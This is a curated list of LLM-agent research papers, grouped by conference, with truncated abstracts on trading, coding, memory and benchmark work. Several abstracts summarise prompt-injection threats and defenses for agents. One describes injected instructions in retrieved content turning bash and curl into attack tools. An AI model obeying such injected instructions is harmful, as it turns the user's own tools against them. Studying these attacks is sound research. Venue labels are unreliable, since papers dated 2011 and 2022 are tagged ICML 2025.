- **[TradingGroup: A Multi-Agent Trading System with Self-Reflection and Data-Synthesis](https://arxiv.org/abs/2508.17565)**
  - *Feng Tian, Flora D. Salim, Hao Xue*
  - **ICML 2025** · OpenReview · `2025-08-01`
  - Recent advancements in large language models (LLMs) have enabled powerful agent-based applications in finance, particularly for sentiment analysis, financial report comprehension, and stock forecasting. However, existing systems often lack inter-agent coordination, structured sel…

- **[Tool-as-Interface: Learning Robot Policies from Observing Human Tool Use](https://openreview.net/forum?id=5udqMOeai1)**
  - *Haonan Chen, Cheng Zhu, Shuijing Liu et al.*
  - **ICML 2025** · OpenReview · `2025-05-10`
  - Tool use is essential for enabling robots to perform complex real-world tasks, but learning such skills requires extensive datasets. While teleoperation is widely used, it is slow, delay-sensitive, and poorly suited for dynamic tasks. In contrast, human videos provide a natural w…

- **[Establishing Best Practices in Building Rigorous Agentic Benchmarks](https://openreview.net/forum?id=E58HNCqoaA)**
  - *Yuxuan Zhu, Tengjun Jin, Yada Pruksachatkun et al.*
  - **ICML 2025** · OpenReview · `2025-05-01`
  - Benchmarks are essential for quantitatively tracking progress in AI. As AI agents become increasingly capable, researchers and practitioners have introduced agentic benchmarks to evaluate agents on complex, real-world tasks. These benchmarks typically measure agent capabilities b…

- **[AIOS: LLM Agent Operating System](https://openreview.net/forum?id=L4HHkCDz2x)**
  - *Kai Mei, Xi Zhu, Wujiang Xu et al.*
  - **ICML 2025** · OpenReview · `2025-03-19`
  - LLM-based intelligent agents face significant deployment challenges, particularly related to resource management. Allowing unrestricted access to LLM or tool resources can lead to inefficient or even potentially harmful resource allocation and utilization for agents. 
Furthermore…

- **[Conversational Agents: A Framework for Evaluation (CAFE)](https://openreview.net/forum?id=s4QQ6uxQcx)**
  - *{'fullname': 'Christine Bauer', 'username': '~Christine_Bauer1'}, {'fullname': 'Li Chen'}, {'fullname': 'Nicola Ferro'} et al.*
  - **ICML 2025** · OpenReview · `2025-03-19`
  - This report documents the program and the outcomes of the Dagstuhl Perspectives Workshop 24352, "Conversational Agents: A Framework for Evaluation (CAFE)", which brought together 22 distinguished researchers and practitioners from 12 countries. In this workshop, a new framework f…

- **[AgenticHypothesis: A Survey on Hypothesis Generation Using LLM Systems](https://openreview.net/forum?id=UeeyfR4CUg)**
  - *Adib Bazgir, Rama chandra Praneeth Madugula, Yuwen Zhang*
  - **ICML 2025** · OpenReview · `2025-02-10`
  - Hypothesis generation is a cornerstone of scientific discovery, enabling researchers to formulate testable ideas that drive innovation and progress. Although traditional methods have proven effective, they are often constrained by cognitive biases, information overload, and time…

- **[agenticMSA: Agentic Multimodal Sentiment Analysis with Task-Specific and Large Language Model Collaboration](https://openreview.net/forum?id=ATwJ8MWnth)**
  - **ICML 2025** · OpenReview · `2025-02-10`
  - Multimodal Sentiment Analysis (MSA) faces challenges due to inconsistencies between modalities, such as conflicting sentiment cues from visual, audio, and text data. These modality conflicts make it difficult for previous task-specific samll-scale models to accurately predict sen…

- **[Performant LLM Agentic Framework for Conversational AI](https://openreview.net/forum?id=JDXB6nvH9x)**
  - *Alex Casella, Wayne Wang*
  - **ICML 2025** · OpenReview · `2025-01-22`
  - The rise of Agentic applications and automation in the Voice AI industry has led to an increased reliance on Large Language Models (LLMs) to navigate graph-based logic workflows composed of nodes and edges. However, existing methods face challenges such as alignment errors in com…

- **[Social Agentics](https://openreview.net/forum?id=yzWu4VvAXE)**
  - *{'fullname': 'Matt Ratto', 'username': '~Matt_Ratto1'}, {'fullname': 'Anastasia Kuzminykh', 'username': ''}, {'fullname': 'Shion Guha', 'username': ''} et al.*
  - **ICML 2025** · OpenReview · `2025-01-01`
  - Agentic AI is being heralded as the next step in the development of AI systems. Agentics, complex ensembles of different machine learning, data processing, and generative AI models, can provide new autonomous and proactive decision-making capabilities to organizations, participat…

- **[Trading Confidence: Comprehensive Uncertainty Estimation in Algorithmic Trading](https://openreview.net/forum?id=IWDsycHMSP)**
  - *Lin Li, Li Rong Wang, Hsuan Fu et al.*
  - **ICML 2025** · OpenReview · `2025-01-01`
  - Description Reinforcement Learning (RL) has emerged as a powerful approach in financial trading, enabling agents to learn optimal strategies through direct market interaction. However, financial markets are highly uncertain, with price fluctuations driven by stochastic volatility…

- **[TradingAgents: Multi-Agents LLM Financial Trading Framework](https://openreview.net/forum?id=4QPrXwMQt1)**
  - *Yijia Xiao, Edward Sun, Di Luo et al.*
  - **ICML 2025** · OpenReview · `2024-12-02`
  - Significant progress has been made in automated problem-solving using societies of agents powered by large language models (LLMs). In finance, efforts have largely focused on single-agent systems handling specific tasks or multi-agent frameworks independently gathering data. Howe…

- **[An Intelligent Agentic System for Complex Image Restoration Problems](https://openreview.net/forum?id=3RLxccFPHz)**
  - *Kaiwen Zhu, Jinjin Gu, Zhiyuan You et al.*
  - **ICML 2025** · OpenReview · `2024-09-26`
  - Real-world image restoration (IR) is inherently complex and often requires combining multiple specialized models to address diverse degradations. Inspired by human problem-solving, we propose AgenticIR, an agentic system that mimics the human approach to image processing by follo…

- **[FinMem: A Performance-Enhanced LLM Trading Agent with Layered Memory and Character Design](https://openreview.net/forum?id=sstfVOwbiG)**
  - *Haohang Li, Yangyang Yu, Zhi Chen et al.*
  - **ICML 2025** · OpenReview · `2024-02-03`
  - Recent advancements in Large Language Models (LLMs) have exhibited notable efficacy in natural language processing (NLP) tasks across diverse domains. Their prowess in integrating extensive knowledge has fueled interest in developing LLM-based autonomous agents. Furthermore, in t…

- **[An Intelligent Agentic System for Complex Image Restoration Problems](https://arxiv.org/abs/2410.17809)**
  - *Kaiwen Zhu, Jinjin Gu, Zhiyuan You et al.*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - Real-world image restoration (IR) is inherently complex and often requires combining multiple specialized models to address diverse degradations. Inspired by human problem-solving, we propose AgenticIR, an agentic system that mimics the human approach to image processing by follo…

- **[TradingAgents: Multi-Agents LLM Financial Trading Framework](https://arxiv.org/abs/2412.20138)**
  - *Yijia Xiao, Edward Sun, Di Luo et al.*
  - **ICML 2025** · OpenReview · `2024-01-01`
  - Significant progress has been made in automated problem-solving using societies of agents powered by large language models (LLMs). In finance, efforts have largely focused on single-agent systems handling specific tasks or multi-agent frameworks independently gathering data. Howe…

- **[ChEF: A Comprehensive Evaluation Framework for Standardized Assessment of Multimodal Large Language Models](https://openreview.net/forum?id=ClqyY6Bvb7)**
  - *Zhelun Shi, Zhipin Wang, Hongxing Fan et al.*
  - **ICML 2025** · OpenReview · `2023-09-15`
  - Multimodal Large Language Models (MLLMs) have shown impressive abilities in interacting with visual content with myriad potential downstream tasks. However, even though a list of benchmarks has been proposed, the capabilities and limitations of MLLMs are still not comprehensively…

- **[Trading off Utility, Informativeness, and Complexity in Emergent Communication](https://openreview.net/forum?id=pcuDXVFRbw)**
  - *Mycal Tucker, Roger Levy, Julie A. Shah et al.*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - Emergent communication (EC) research often focuses on optimizing task-specific utility as a driver for communication. However, there is increasing evidence that human languages are shaped by task-general communicative constraints and evolve under pressure to optimize the Informat…

- **[Cryptocurrency Trading Agent Using Deep Reinforcement Learning](https://openreview.net/forum?id=XW3tnMhPFu)**
  - *Uwais Suliman, Terence L. van Zyl, Andrew Paskaramoorthy*
  - **ICML 2025** · OpenReview · `2022-01-01`
  - Cryptocurrencies are peer-to-peer digital assets monitored and organised by a blockchain network. Price prediction has been a significant focus point with various machine learning algorithms, especially concerning cryptocurrency. This work addresses the challenge faced by traders…

- **[Trading Agents](https://openreview.net/forum?id=8QTqyKAeeN)**
  - *Michael P. Wellman*
  - **ICML 2025** · OpenReview · `2011-01-01`
  - Automated trading in electronic markets is one of the most common and consequential applications of autonomous software agents.

- **[MAS-GPT: Training LLMs to Build LLM-based Multi-Agent Systems](https://arxiv.org/abs/2503.03686)**
  - *Rui Ye, Shuo Tang, Rui Ge et al.*
  - **ICML 2025** · `2025-03-05`
  - LLM-based multi-agent systems (MAS) have shown significant potential in tackling diverse tasks. However, to design effective MAS, existing approaches heavily rely on manual configurations or multiple calls of advanced LLMs, resulting in inadaptability and high inference costs. In…

- **[MedRAX: Medical Reasoning Agent for Chest X-ray](https://arxiv.org/abs/2502.02673)**
  - *Adibvafa Fallahpour, Jun Ma, Alif Munim et al.*
  - **ICML 2025** · `2025-02-04`
  - Chest X-rays (CXRs) play an integral role in driving critical decisions in disease management and patient care. While recent innovations have led to specialized models for various CXR interpretation tasks, these solutions often operate in isolation, limiting their practical utili…

- **[OrcaLoca: An LLM Agent Framework for Software Issue Localization](https://arxiv.org/abs/2502.00350)**
  - *Zhong-Ming Yu, He-Jia Zhang, Yu-Jie Zhao et al.*
  - **ICML 2025** · `2025-02-01`
  - Recent developments in Large Language Model (LLM) agents are revolutionizing Autonomous Software Engineering (ASE), enabling automated coding, problem fixes, and feature improvements. However, localization -- precisely identifying software problems by navigating to relevant code…

- **[RepoAudit: An Autonomous LLM-Agent for Repository-Level Code Auditing](https://arxiv.org/abs/2501.18160)**
  - *Jin-Yao Guo, Cheng-Peng Wang, Xiang-Zhe Xu et al.*
  - **ICML 2025** · `2025-01-30`
  - Code auditing is the process of reviewing code with the aim of identifying bugs. Large Language Models (LLMs) have demonstrated promising capabilities for this task without requiring compilation, while also supporting user-friendly customization. However, auditing a code reposito…


### ICLR

- **[RedCodeAgent: Automatic Red-teaming Agent against Diverse Code Agents](https://arxiv.org/abs/2510.02609)**
  - *Cheng-Quan Guo, Chulin Xie, Yu Yang et al.*
  - **ICLR 2025** · `2025-10-02`
  - Code agents have gained widespread adoption due to their strong code generation capabilities and integration with code interpreters, enabling dynamic execution, debugging, and interactive programming capabilities. While these advancements have streamlined complex workflows, they…

- **[MME-Emotion: A Holistic Evaluation Benchmark for Emotional Intelligence in Multimodal Large Language Models](https://arxiv.org/abs/2508.09210)**
  - *Fan Zhang, Ze-Bang Cheng, Chong Deng et al.*
  - **ICLR 2025** · `2025-08-11`
  - Recent advances in multimodal large language models (MLLMs) have catalyzed transformative progress in affective computing, enabling models to exhibit emergent emotional intelligence. Despite substantial methodological progress, current emotional benchmarks remain limited, as it i…

- **[OpenAgentSafety: A Comprehensive Framework for Evaluating Real-World AI Agent Safety](https://arxiv.org/abs/2507.06134)**
  - *S. Vijayvargiya, Aditya Bharat Soni, Xuhui Zhou et al.*
  - **ICLR 2025** · `2025-07-08`
  - Recent advances in AI agents capable of solving complex, everyday tasks, from scheduling to customer service, have enabled deployment in real-world settings, but their possibilities for unsafe behavior demands rigorous evaluation. While prior benchmarks have attempted to assess a…

- **[Paper2Code: Automating Code Generation from Scientific Papers in Machine Learning](https://arxiv.org/abs/2504.17192)**
  - *Minju Seo, Jinheon Baek, Seongyun Lee et al.*
  - **ICLR 2025** · `2025-04-24`
  - Despite the rapid growth of machine learning research, corresponding code implementations are often unavailable, making it slow and labor-intensive for researchers to reproduce results and build upon prior work. In the meantime, recent Large Language Models (LLMs) excel at unders…

- **[SocialJax: An Evaluation Suite for Multi-agent Reinforcement Learning in Sequential Social Dilemmas](https://arxiv.org/abs/2503.14576)**
  - *Zi-Hao Guo, Shu-Qing Shi, Richard Willis et al.*
  - **ICLR 2025** · `2025-03-18`
  - Sequential social dilemmas pose a significant challenge in the field of multi-agent reinforcement learning (MARL), requiring environments that accurately reflect the tension between individual and collective interests. Previous benchmarks and environments, such as Melting Pot, pr…


### KDD

- **[Agent-Diff: Benchmarking LLM Agents on Enterprise API Tasks via Code Execution with State-Diff-Based Evaluation](https://arxiv.org/abs/2602.11224)**
  - *Hubert M. Pysklo, A. Zhuravel, Patrick Watson*
  - **KDD 2026** · `2026-02-11`
  - We present Agent-Diff, a novel benchmarking framework for evaluating agentic Large Language Models (LLMs) on real-world productivity software API tasks via code execution. Agentic LLM performance varies due to differences in models, external tool access, prompt structures, and ag…


### ACL

- **[We Are What We Remember: Mental-State-Driven Memory for Long-Term Character Dialogue](https://arxiv.org/abs/2611.16223v1)**
  - *Zhicheng Jia, Shuchen Wu, Zhuoshi Tong et al.*
  - **ACL** · `2026-11-12`
  - Shared history in human dialogue is not merely a repository of facts, but the foundation of evolving relationships and mutual understanding. However, mainstream conversational memory systems rely on passive semantic similarity over external fact stores, frequently retrieving topi…

- **[When Agents Need to Consolidate Memories: What RRR Consolidation Explains, and What It Does Not Explain, in Conversation ESAA](https://arxiv.org/abs/2611.15644v1)**
  - *Elzo Brito dos Santos Filho*
  - **ACL** · `2026-11-11`
  - Language-model agents can share conversational history across sessions, but persistence does not guarantee retrieval of current decisions and their provenance. This engineering study presents Memory-TCG, a Conversation ESAA extension inspired by ringing, resonance and renormaliza…

- **[Testing Conversation Preservation Across LLM APIs: A Rule-Based Oracle for Detecting Silent Information Loss](https://arxiv.org/abs/2611.15543v1)**
  - *Xin Liu, Xu Han, Yuxin Wang et al.*
  - **ACL** · `2026-11-11`
  - LLM applications increasingly rely on translators and compatibility layers to move conversations across APIs. Yet a translated request can be accepted by the target API while silently losing information about instruction roles, tool interactions, error states, or generation contr…

- **[From Attack Surface to Defense Architecture: Compositional Security for Agentic Coding Harnesses](https://arxiv.org/abs/2611.13960v1)**
  - *Simon Hegelich, Bardh Prenkaj, Habiba Sarhan et al.*
  - **ACL** · `2026-11-10`
  - AI coding harnesses couple language models to shells, filesystems, and network sockets, turning the harness into an automated Living-off-the-Land (LotL) platform: once an adversary injects instructions into retrieved content, dual-use binaries such as bash, curl, and find become…

- **[Megrez: A Knowledge-Guided Agent for Formal Mathematics over MK Set Theory](https://arxiv.org/abs/2611.13613v1)**
  - *Tiancheng Xu, Wensheng Yu*
  - **ACL** · `2026-11-10`
  - General-purpose coding agents equipped with proof-assistant tools have shown strong performance on standalone competition problems, yet cumulative textbook formalization inside a low-resource mathematical library still faces three obstacles: aligning textbook concepts with librar…

- **[ParaCodex: A Profiling-Guided Autonomous Coding Agent for Reliable Parallel Code Generation and Translation](https://arxiv.org/abs/2601.04327)**
  - *Erel Kaplan, Tomer Bitan, Lian Ghrayeb et al.*
  - **ACL 2026** · `2026-01-07`
  - Parallel programming is central to HPC and AI, but producing code that is correct and fast remains challenging, especially for OpenMP GPU offload, where data movement and tuning dominate. Autonomous coding agents can compile, test, and profile on target hardware, but outputs are…

- **[SecureWebArena: A Holistic Security Evaluation Benchmark for LVLM-based Web Agents](https://arxiv.org/abs/2510.10073)**
  - *Zong-Hao Ying, Yang-Guang Shao, Jian-Le Gan et al.*
  - **ACL 2025** · `2025-10-11`
  - Large vision-language model (LVLM)-based web agents are emerging as powerful tools for automating complex online tasks. However, when deployed in real-world environments, they face serious security risks, motivating the design of security evaluation benchmarks. Existing benchmark…

- **[DocAgent: A Multi-Agent System for Automated Code Documentation Generation](https://arxiv.org/abs/2504.08725)**
  - *Dayu Yang, Antoine Simoulin, Xin Qian et al.*
  - **ACL 2025** · `2025-04-11`
  - High-quality code documentation is crucial for software development especially in the era of AI. However, generating it automatically using Large Language Models (LLMs) remains challenging, as existing approaches often produce incomplete, unhelpful, or factually incorrect outputs…

- **[METAL: A Multi-Agent Framework for Chart Generation with Test-Time Scaling](https://arxiv.org/abs/2502.17651)**
  - *Bing-Xuan Li, Yi-Wei Wang, Jiu-Xiang Gu et al.*
  - **ACL 2025** · `2025-02-24`
  - Chart generation aims to generate code to produce charts satisfying the desired visual properties, e.g., texts, layout, color, and type. It has great potential to empower the automatic professional report generation in financial analysis, research presentation, education, and hea…

- **[LLM Agents Making Agent Tools](https://arxiv.org/abs/2502.11705)**
  - *G. Wölflein, Dyke Ferber, D. Truhn et al.*
  - **ACL 2025** · `2025-02-17`
  - Tool use has turned large language models (LLMs) into powerful agents that can perform complex multi-step tasks by dynamically utilising external software components. However, these tools must be implemented in advance by human developers, hindering the applicability of LLM agent…

- **[G-Safeguard: A Topology-Guided Security Lens and Treatment on LLM-based Multi-agent Systems](https://arxiv.org/abs/2502.11127)**
  - *Shilong Wang, Gui-Min Zhang, Miao Yu et al.*
  - **ACL 2025** · `2025-02-16`
  - Large Language Model (LLM)-based Multi-agent Systems (MAS) have demonstrated remarkable capabilities in various complex tasks, ranging from collaborative problem-solving to autonomous decision-making. However, as these systems become increasingly integrated into critical applicat…

- **[nvAgent: Automated Data Visualization from Natural Language via Collaborative Agent Workflow](https://arxiv.org/abs/2502.05036)**
  - *Geliang Ouyang, Jingya Chen, Zhihe Nie et al.*
  - **ACL 2025** · `2025-02-07`
  - Natural Language to Visualization (NL2Vis) seeks to convert natural-language descriptions into visual representations of given tables, empowering users to derive insights from large-scale data. Recent advancements in Large Language Models (LLMs) show promise in automating code ge…

- **[Qwen2.5-xCoder: Multi-Agent Collaboration for Multilingual Code Instruction Tuning](https://aclanthology.org/2025.acl-long.642.pdf)**
  - *Jian Yang, Wei Zhang, Yi-Bo Miao et al.*
  - **ACL 2025**
  - ,


### EMNLP

- **[Code Like Humans: A Multi-Agent Solution for Medical Coding](https://arxiv.org/abs/2509.05378)**
  - *A. Motzfeldt, Joakim Edin, Casper L. Christensen et al.*
  - **EMNLP 2025** · `2025-09-04`
  - In medical coding, experts map unstructured clinical notes to alphanumeric codes for diagnoses and procedures. We introduce Code Like Humans: a new agentic framework for medical coding with large language models. It implements official coding guidelines for human experts, and it…

- **[ScreenCoder: Advancing Visual-to-Code Generation for Front-End Automation via Modular Multimodal Agents](https://arxiv.org/abs/2507.22827)**
  - *Yi-Lei Jiang, Yaozhi Zheng, Yuxuan Wan et al.*
  - **EMNLP 2025** · `2025-07-30`
  - Automating the transformation of user interface (UI) designs into front-end code holds significant promise for accelerating software development and democratizing design workflows. While multimodal large language models (MLLMs) can translate images to code, they often fail on com…

- **[Agent Laboratory: Using LLM Agents as Research Assistants](https://arxiv.org/abs/2501.04227)**
  - *Samuel Schmidgall, Yu-Sheng Su, Ze Wang et al.*
  - **EMNLP 2025** · `2025-01-08`
  - Historically, scientific discovery has been a lengthy and costly process, demanding substantial time and resources from initial conception to final results. To accelerate scientific discovery, reduce research costs, and improve research quality, we introduce Agent Laboratory, an…


### NAACL

- **[CODESIM: Multi-Agent Code Generation and Problem Solving through Simulation-Driven Planning and Debugging](https://arxiv.org/abs/2502.05664)**
  - *Md. Ashraful Islam, Mohammed Eunus Ali, Md. Rizwan Parvez*
  - **NAACL 2025** · `2025-02-08`
  - Large Language Models (LLMs) have made significant strides in code generation and problem solving. Current approaches employ external tool-based iterative debuggers that use compiler or other tool-based runtime feedback to refine coarse programs generated by various methods. Howe…


### Other / arXiv

- **[Actor, Judge, or Teacher? Understanding Decision Models in Long-Horizon Agents](https://arxiv.org/abs/2611.17167)**
  - *Haochen Liu, Qianhao Zhu, Zixuan Wang et al.*
  - 🤗 Featured · `2026-11-12`
  - Decision models answer a question with a typed output, such as a choice among options with a probability for each, so one model can choose an agent's actions, evaluate actions already taken, or score every action to teach a policy with reinforcement learning. Prior work has studi…

- **[DeepStress: Stress-Testing Deep Search Agents](https://arxiv.org/abs/2607.13920)**
  - *Ismael Rousseau, Geraldine Damnati, Frederic Bechet*
  - 🤗 Featured · `2026-11-12`

- **[Experience-Handoff Reinforcement Learning for Recursive Self-Improvement](https://arxiv.org/abs/2611.16409)**
  - *Doyoung Kim, Byeongguk Jeon, Kailin Zhang et al.*
  - 🤗 Featured · `2026-11-12`
  - It is common to train Large Language Models (LLMs) for agentic tasks with Reinforcement Learning (RL) from scalar rewards. However, this throws away the fine-grained information about the environment that the agent experienced during the trial (e.g., error logs). To utilize this…

- **[JustRUA: A Controlled Study of GPT-6 Robot-Use Agents](https://arxiv.org/abs/2611.16009)**
  - *Zefan Wang, Yufan Dang, Xuanwei Shi et al.*
  - 🤗 Featured · `2026-11-11`
  - GPT-6 Astra can drive a robot arm directly through a fixed harness, and scores of such robot-use agents on RoboDojo have risen quickly since. Reported systems differ in harness and test subset and often change several designs at once, so it is hard to tell which choices produce t…

- **[A Cross-Scenario Survey and Analysis of Self-Evolving Multimodal Agents](https://arxiv.org/abs/2611.14256)**
  - *Jingjing Jiang*
  - 🤗 Featured · `2026-11-10`
  - Recent work shows that multimodal agents increasingly self-improve without recurring human annotation. However, each self-improvement mechanism is designed and evaluated within a single scenario, leaving its preconditions unverified under cross-scenario transfer. This survey inve…

- **[HiVe-Mem: Interleaving Horizontal Memory Expansion and Vertical Evidence Composition for Multimodal Agents](https://arxiv.org/abs/2611.12872)**
  - *Haozhen Zhang, Bohan Liu, Jianzhu Bao et al.*
  - 🤗 Featured · `2026-11-09`

- **[Agent-R^2: Scaling Agents for Realistic Productivity Work via Real-Source Data Synthesis](https://arxiv.org/abs/2611.08219)**
  - *Teng Pan, Zixuan Wang, Yuchen Yan et al.*
  - 🤗 Featured · `2026-11-05`

- **[Evidence-Guided Recovery for AI Agents with Ambiguous Tool Outcomes and Partial Execution](https://arxiv.org/abs/2610.41453)**
  - *Genliang Zhu, Xiaobo Chen, Ziyuan Wang et al.*
  - 🤗 Featured · `2026-10-30`

- **[The Value of Thinking: Learning When to Reason in Hybrid Decision Models](https://arxiv.org/abs/2611.16961)**
  - *Zhengxu Yu, Ke Xu, Meng Fang et al.*
  - 🤗 · `2026-11-12`
  - Existing adaptive-reasoning methods shorten the explicit reasoning a model writes, or skip it by switching modes; either way the answer is still written out token by token. \emph{Rather than deciding how much to think}, we explore a different paradigm, \emph{zero-or-$T$ thinking}…

- **[When Expert Disagreement Hurts: Prestige and Selectivity in LLM Decision Revision](https://arxiv.org/abs/2611.16694)**
  - *Yupeng Tang, Mingfeng Lin*
  - 🤗 · `2026-11-12`
  - When language models revise a decision after another agent disagrees, neither reversal counts nor final accuracy shows whether they are fixing mistakes or abandoning correct answers. We introduce a controlled two-pass audit that holds the question, the evidence, and the model's i…

- **[SAVE: Less is More in Agentic Video Reasoning](https://arxiv.org/abs/2611.15079)**
  - *Tymoteusz Wilk, Sergey Prokudin, Xi Wang*
  - 🤗 · `2026-11-11`

- **[Science Prediction Universe](https://arxiv.org/abs/2611.15049)**
  - *Zengji Tu, Xiang Liu, Jiarui Sun et al.*
  - 🤗 · `2026-11-11`
  - Humanity has long sought to explain natural phenomena. Reliable prediction of experimental outcomes is a central test of our understanding of the processes that produce them. If artificial general intelligence (AGI) is to surpass human scientific capabilities, it must also predic…

- **[AgentSSL: Can MLE Agents Leverage Unlabeled Data?](https://arxiv.org/abs/2611.17323v1)**
  - *Ethan Lin, Akanksha Sarkar, Ziang Liu et al.*
  - `2026-11-12`
  - Applying machine learning systems to new domains introduces bottlenecks in both labeled data acquisition and manual pipeline engineering. While recent MLE agents show promise in automating pipeline design, they have been studied almost exclusively in fully supervised settings, le…

- **[CoReMem: Cost-Internalizing Memory for Successive Coding Tasks with Prospective Valuation](https://arxiv.org/abs/2611.17316v1)**
  - *Peiwen Li, Harshit Verma, Sophia Zhou et al.*
  - `2026-11-12`
  - Coding agents tackle successive tasks on an evolving repository, carrying forward edits and writing memory before the next task is known. Selecting memory for unknown next tasks requires balancing future usefulness against the costs of writing and reading it. The actor must also…

- **[Metal Sandbox: Isolated Execution and Command Scheduling for GPU Coding Agents on Apple Silicon](https://arxiv.org/abs/2611.17294v1)**
  - *Haozhe Wang, Lina Chen, Fanqi Wan et al.*
  - `2026-11-12`
  - On-device inference requires kernels that make effective use of local accelerators. Efficient training and evaluation of models that generate Apple Metal kernels benefit from native macOS tools and concurrent agent sessions. These sessions alternate between model requests, develo…

- **[LiveGeo: Benchmarking Geographic Agents in Continuously Evolving Worlds](https://arxiv.org/abs/2611.17267v1)**
  - *Pengcheng Zhou, Xuanyu Liu, Yanchen Yin et al.*
  - `2026-11-12`
  - We introduce GeoWorld, a controllable and continuously evolving geographic environment platform for LLM agents, and LiveGeo, a benchmark for evaluating reliable decision-making in real-world geographic environments using GeoWorld. Unlike existing evaluations that largely reason a…

- **[Scalable Conversational Assessment: Chat-Based Exams with a Two-Agent LLM Pipeline](https://arxiv.org/abs/2611.17220v1)**
  - *Geoffrey Challen, Craig Zilles*
  - `2026-11-12`
  - Oral exams are compelling because (1) students can be asked to provide their reasoning for an answer and (2) their interactive nature permits follow-up questions to resolve ambiguous answers. But oral exams scale poorly. In this paper, we present scalable conversational assessmen…

- **[Cortex-FL: Agent-Mediated Collaboration for Federated Learning](https://arxiv.org/abs/2611.17186v1)**
  - *Rui Sun, Jinfeng Peng, Zehua Cheng et al.*
  - `2026-11-12`
  - Federated learning (FL) enables independent data owners to train models collaboratively without centralizing raw data. However, identifying collaborators, preparing training tasks, and coordinating execution and incentives hinder its practical adoption by organizations without sp…

- **[CapLite: Prompt-Injection Defense for Small Language Model Agents without Model-Written Security Artifacts](https://arxiv.org/abs/2611.17115v1)**
  - *Zimo Xu, Wenzhuo Liu, Hideki Nakayama*
  - `2026-11-12`
  - Enforcement defenses against prompt injection, such as CaMeL, Progent, IPIGuard and DRIFT, ask the agent's own model to write a security artifact (a program, a privilege policy, a dependency graph or a constraint list) that code then enforces. We ask whether small language model…

- **[Designing Institutions for Autonomous AI](https://arxiv.org/abs/2611.17114v1)**
  - *Petter Törnberg*
  - `2026-11-12`
  - As autonomous AI agents increasingly interact in persistent populations, their collective capabilities and alignment depend not only on individual models, but also on the institutions governing their interactions. Yet AI research has largely focused on individual agents. In this…

- **[Discovering Effective Agent Memory Designs through Program Evolution](https://arxiv.org/abs/2611.17068v1)**
  - *Xinheng Ding, Seyyed Saeid Cheshmi, Ziyang Zhang et al.*
  - `2026-11-12`
  - Program evolution provides a promising approach to discover agent memory designs and study the choices underlying their effectiveness. We introduce MAPE, a framework that evolves whole memory programs from minimal seeds through a standardized lifecycle interface and an iterative…

- **[Auditing AI peer reviewers: a benchmark on real scientific papers](https://arxiv.org/abs/2611.17052v1)**
  - *Íñigo Zubeldia, Boris Bolliet, Francisco Villaescusa-Navarro et al.*
  - `2026-11-12`
  - LLM-based peer review is now used at production scale, but its evaluation remains limited. We introduce a benchmark that injects objective, localisable errors of four types (general issues, mathematics, numerics, citations) at three severity levels into real papers and measures e…

- **[From Delegation to Coordination: Learning Efficient Multi-Agent Deep Research](https://arxiv.org/abs/2611.17041v1)**
  - *Yuyang Wu, Yang Liu, Zequn Xie et al.*
  - `2026-11-12`
  - Multi-agent deep-research systems use delegation to parallelize search and keep long tool traces out of the main agent's context. Yet delegation helps only when task allocation and subtask execution are coordinated: the main agent must issue useful subtasks, while subagents must…

- **[AI for Biologists: The Knowledge Boundaries of Foundation Models in the Age of Agentic Systems](https://arxiv.org/abs/2611.17015v1)**
  - *Tian Cai, Andrew Kleist, Jaimin Patel et al.*
  - `2026-11-12`
  - Artificial intelligence (AI) is changing how biological research is done. Biological foundation models trained on millions of nucleotides, protein, and single-cell measurements predict protein structures, mutation effects, and cellular responses to genetic perturbations. Agentic…

- **[Skill Adapter: Personalized Modification and Online Routing of General-Purpose Skills](https://arxiv.org/abs/2611.17007v1)**
  - *Qijia Zhuang, Yanyi Gou, Wenbin Ma et al.*
  - `2026-11-12`
  - Large language model (LLM) agents use external skills to reuse task procedures and experience with tools. General-purpose skills describe shared execution procedures, while specific tool choices, operating practices, and output requirements vary across users. In long-horizon task…

- **[AnalogLayoutWorld: An Open Benchmark for Agentic Analog Layout Design](https://arxiv.org/abs/2611.16991v1)**
  - *NovaSilicon Team*
  - `2026-11-12`
  - Coding agents have demonstrated strong capabilities in software development, yet their ability to tackle long-horizon engineering tasks governed by physical constraints remains less understood. We study this question through analog circuit layout, which demands domain knowledge,…

- **[Primer: An AI Framework for Instructor-Centered Educational Simulation Creation](https://arxiv.org/abs/2611.16986v1)**
  - *Ethan Mollick, Lilach Mollick, Ben Przystanski et al.*
  - `2026-11-12`
  - Educational simulations are a well-established pedagogical technique that gives learners opportunities to apply knowledge, respond to challenges, and reflect on their performance. High-quality simulations, however, are difficult to build, requiring instructor input, scenario desi…

- **[Compiling Known Rules into Compact Neural Agents: Weight-Space Programming on Unseen Games](https://arxiv.org/abs/2611.16981v1)**
  - *Jens Lehmann*
  - `2026-11-12`
  - Weight-space programming (WSP) uses language models to construct neural network weights without training. We test whether known game mechanics can be compiled into compact agents that generalise to held-out levels, renderings and start states within a game family. Writers receive…

- **[S1-Evo: Experience-Guided Evidence Competition Attacks on Typed System-1 Decision Models](https://arxiv.org/abs/2611.16937v1)**
  - *Kaixiang Wang, Junjie Li, Zhaojiacheng Zhou et al.*
  - `2026-11-12`
  - Typed System-1 (S1) decision models are increasingly deployed in LLM agents for routing, moderation, and authorization to cut inference cost, yet untrusted context can still manipulate typed outputs and alter execution branches. Unlike autoregressive System-2 (S2) models, S1 inte…

- **[Context Graph: Explainable Multi-Agent Decision Chains in AI-RAN](https://arxiv.org/abs/2611.16879v1)**
  - *Xijun Wang, Zhaoyang Liu, Xiang Chen et al.*
  - `2026-11-12`
  - AI-RAN distributes network control across multiple autonomous agents, namely xApps and rApps operating over shared radio resources. When an alert or degradation appears, operators currently lack a structured way to trace which decision caused it, what context triggered that decis…

- **[DPA: Decentralized Primal Averaging with Quasi-Global Momentum for Highly Heterogeneous Data](https://arxiv.org/abs/2611.16871v1)**
  - *Diyako Ghaderyan, Stefan Werner*
  - `2026-11-12`
  - Decentralized training of deep learning models keeps training data local and supports on-device learning over networks. In realistic scenarios, heterogeneity across agents' local data poses an optimization challenge and can severely degrade test accuracy, especially on sparse com…

- **[Evaluating Video LLMs' Understanding of Corner Cases in Autonomous Driving](https://arxiv.org/abs/2611.16767v1)**
  - *Gabriel Manalu, Minh Son Hoang, Hyeontaek Hwang et al.*
  - `2026-11-12`
  - Natural language explanations promised by modern Video Large Language Models (Video LLMs) offer autonomous driving systems a path toward detailed scene description and interpretable decision making on the road. While recent benchmarks have begun assessing these models on driving…

- **[Scale-Induced Semantic Shift in Visual Prompt Injection Against VLMs and Web Agents](https://arxiv.org/abs/2611.16744v1)**
  - *Yiheng Zhao, Runze Ji, Chenyu Yi et al.*
